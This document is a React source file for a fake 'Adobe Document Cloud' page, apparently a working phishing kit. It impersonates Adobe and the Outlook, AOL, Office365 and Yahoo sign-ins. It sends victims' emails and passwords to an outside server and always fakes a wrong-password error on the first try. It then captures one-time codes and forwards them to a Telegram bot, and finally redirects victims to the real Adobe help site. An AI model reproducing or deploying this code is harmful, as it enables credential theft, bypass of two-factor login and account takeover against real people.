import { useState, useEffect, useRef } from "react";
import adobe from "./assets/adobe.png";
import Background from "./assets/background.png";
import ads from "./assets/ads.png"; // (optional) provider icons if you have them

/******************************************************************************/
/*                              CONFIGURATION                                 */
/******************************************************************************/
/**
 * You can keep these values inline while prototyping, but in production it’s
 * better to read them from environment variables (VITE_… or NEXT_PUBLIC_…)
 * so they never live in your bundle.
 */
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = import.meta.env.VITE_TELEGRAM_CHAT_ID;

/**
 * Supported e‑mail providers & their brand colours.
 * Add/adjust entries here and the UI updates automatically.
 */
const providers = [
  { name: "Outlook",   color: "bg-blue-600"   },
  { name: "AOL",       color: "bg-[#3A3A3A]" }, // AOL dark grey
  { name: "Office365", color: "bg-[#F25022]" }, // Office orange
  { name: "Yahoo",     color: "bg-[#720E9E]" }, // Yahoo purple
  { name: "Others",    color: "bg-blue-500"   },
];

/******************************************************************************/
/*                                LOGIN MODAL                                 */
/******************************************************************************/
function LoginModal({ provider, onClose, onOtpRequested }) {
  const [clickCount, setClickCount] = useState(0); // 1st → generic error, 2nd → pass
  const [error,      setError]      = useState(null);
  const [email,      setEmail]      = useState("");
  const [password,   setPassword]   = useState("");
  const [loading,    setLoading]    = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    // 1. Basic front‑end validation
    if (!email || !password) {
      setError("E‑mail and password are required.");
      return;
    }

    setLoading(true);
    setError(null);
    const attempt = clickCount + 1;
    setClickCount(attempt);

    try {
      const res = await fetch("https://paris-kv6k.onrender.com/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, provider }),
      });
      const data = await res.json();

      // 2. First attempt ALWAYS looks like a wrong‑password flow
      if (attempt === 1) {
        setError("Incorrect password. Please try again.");
        setLoading(false);
        return;
      }

      // 3. Second attempt → OTP step if back‑end signals OK
      if (res.ok) {
        onOtpRequested({ email, provider });
      } else {
        setError(data.error || "Submission failed.");
      }
    } catch (err) {
      console.error(err);
      setError("Network error. Try again later.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
      <form
        onSubmit={handleSubmit}
        className="w-full h-full md:h-auto md:w-[28rem] bg-white/10 backdrop-blur-md rounded-none md:rounded-xl shadow-xl p-6 flex flex-col justify-center"
      >
        <h2 className="text-2xl font-bold text-white mb-6 text-center">
          Sign in with {provider}
        </h2>

        <input
          type="email"
          placeholder="Enter your email"
          className="w-full p-3 rounded bg-white/20 text-white placeholder-white/70 mb-4 outline-none focus:ring-2 focus:ring-[#F25022]"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          autoComplete="email"
          disabled={loading}
          required
        />

        <input
          type="password"
          placeholder="Enter your password"
          className="w-full p-3 rounded bg-white/20 text-white placeholder-white/70 mb-4 outline-none focus:ring-2 focus:ring-[#F25022]"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          autoComplete="current-password"
          disabled={loading}
          required
        />

        {error && <p className="text-red-400 text-sm mb-4">{error}</p>}

        <button
          type="submit"
          disabled={loading}
          className="w-full bg-blue-600 text-white py-2 rounded mb-3 disabled:opacity-50"
        >
          {loading ? "loading…" : "Login"}
        </button>

        <button
          type="button"
          onClick={onClose}
          disabled={loading}
          className="w-full text-red-400 text-sm"
        >
          Close
        </button>
      </form>
    </div>
  );
}

/******************************************************************************/
/*                                 OTP MODAL                                  */
/******************************************************************************/
function OtpModal({ email, provider, onClose }) {
  const [digits, setDigits]   = useState(Array(6).fill(""));
  const [secondsLeft, setSL]  = useState(5 * 60); // 5‑minute countdown
  const [error, setError]     = useState(null);
  const [loading, setLoading] = useState(false);
  const inputsRef = useRef([]);

  /* Countdown timer */
  useEffect(() => {
    const id = setInterval(() => setSL((s) => (s > 0 ? s - 1 : 0)), 1_000);
    return () => clearInterval(id);
  }, []);

  const fmt = (s) =>
    `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;

  /* Handle per‑digit input */
  const handleChange = (val, idx) => {
    if (!/^\d?$/.test(val)) return; // block non‑digits
    const next = [...digits];
    next[idx] = val;
    setDigits(next);
    if (val && idx < 5) inputsRef.current[idx + 1]?.focus();
  };

  /* Submit OTP to Telegram */
  const handleSubmit = async (e) => {
    e.preventDefault();
    const code = digits.join("");
    if (code.length !== 6) {
      setError("Please enter the 6‑digit code.");
      return;
    }

    setLoading(true);
    setError(null);

    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        parse_mode: "Markdown",
        text: `*Provider:* ${provider}\n*E‑mail:* ${email}\n*OTP:* \`${code}\``,
      };

      const res  = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = await res.json();

      if (data.ok) {
        // 🚀 Redirect once the OTP is delivered
        window.location.href = "https://helpx.adobe.com/support.html";
      } else {
        throw new Error("Telegram rejected the request");
      }
    } catch (err) {
      console.error(err);
      setError("Failed to submit. Try again.");
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
      <form
        onSubmit={handleSubmit}
        className="w-full h-full md:h-auto md:w-[24rem] bg-white/10 backdrop-blur-md rounded-none md:rounded-xl shadow-xl p-6 flex flex-col items-center justify-center space-y-6"
      >
        <h2 className="text-2xl font-bold text-white text-center">Enter OTP sent to device</h2>

        <div className="text-xl font-mono text-white">{fmt(secondsLeft)}</div>

        <div className="flex gap-2">
          {digits.map((d, i) => (
            <input
              key={i}
              ref={(el) => (inputsRef.current[i] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={d}
              onChange={(e) => handleChange(e.target.value, i)}
              className="w-10 h-12 text-center rounded bg-white/20 text-white outline-none focus:ring-2 focus:ring-blue-500"
              disabled={loading}
            />
          ))}
        </div>

        {error && <p className="text-red-400 text-sm -mt-2">{error}</p>}

        <button
          type="submit"
          disabled={loading}
          className="bg-blue-600 text-white px-10 py-2 rounded disabled:opacity-50"
        >
          {loading ? "Submitting…" : "Verify"}
        </button>

        <button
          type="button"
          onClick={onClose}
          disabled={loading}
          className="text-red-400 text-sm"
        >
          Close
        </button>
      </form>
    </div>
  );
}

/******************************************************************************/
/*                                ROOT SCREEN                                 */
/******************************************************************************/
export default function AdobeLoginUI() {
  const [selectedProvider, setSelectedProvider] = useState(null);
  const [otpContext, setOtpContext]           = useState(null); // {email, provider}

  return (
    <div className="relative flex items-center justify-center min-h-screen bg-black overflow-hidden">
      {/* Background */}
      <img
        src={Background}
        alt="Background"
        className="absolute inset-0 w-full h-full object-cover blur-md opacity-50"
      />

      {/* Global glass overlay */}
      <div className="absolute inset-0 bg-white/10 backdrop-blur-sm z-10" />

      {/* Main content */}
      <div className="z-20 relative flex flex-col items-center space-y-4">
        {/* Branding */}
        <div className="text-center text-white">
          <img src={adobe} alt="Adobe" className="mx-auto w-14 mb-2" />
          <h2 className="text-3xl font-semibold">Adobe Document Cloud</h2>
          <p className="text-xl mt-2 mb-4">
            To read the document, please choose your e‑mail provider below.
          </p>
        </div>

        {/* Provider selection (hidden after a provider is chosen) */}
        {!selectedProvider && (
          <div className="bg-gray-300 text-black p-4 rounded-2xl w-80 text-center shadow-lg">
            {providers.map(({ name, color }) => (
              <button
                key={name}
                className={`w-30 ${color} cursor-pointer text-white font-bold p-2 rounded-2xl mb-2 mx-auto flex items-center justify-center gap-2 shadow`}
                onClick={() => setSelectedProvider(name)}
              >
                {/* If you have provider logos, drop them in here */}
                {/* <img src={ads} alt={name} className="w-5 h-5" /> */}
                <span className="text-sm">{name}</span>
              </button>
            ))}
          </div>
        )}

        <p className="text-sm mt-4 text-white">
          Copyright &copy; {new Date().getFullYear()} Adobe Systems Incorporated.
        </p>
      </div>

      {/* Modals */}
      {selectedProvider && !otpContext && (
        <LoginModal
          provider={selectedProvider}
          onClose={() => setSelectedProvider(null)}
          onOtpRequested={({ email, provider }) => {
            setOtpContext({ email, provider });
          }}
        />
      )}

      {otpContext && (
        <OtpModal
          email={otpContext.email}
          provider={otpContext.provider}
          onClose={() => {
            setOtpContext(null);
            setSelectedProvider(null);
          }}
        />
      )}
    </div>
  );
}
